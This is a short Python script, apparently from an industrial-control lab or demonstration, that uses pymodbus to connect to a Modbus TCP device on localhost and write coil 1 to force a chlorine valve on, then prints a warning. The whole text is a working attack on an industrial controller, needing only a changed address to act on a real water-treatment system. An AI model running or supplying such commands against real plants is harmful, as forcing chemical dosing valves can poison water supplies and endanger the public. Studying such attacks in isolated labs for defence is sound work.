
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("localhost", port=502)
client.connect()

# Force chlorine valve ON (coil 1)
client.write_coil(1, True)

print("⚠️ Chlorine valve forced ON")

client.close()
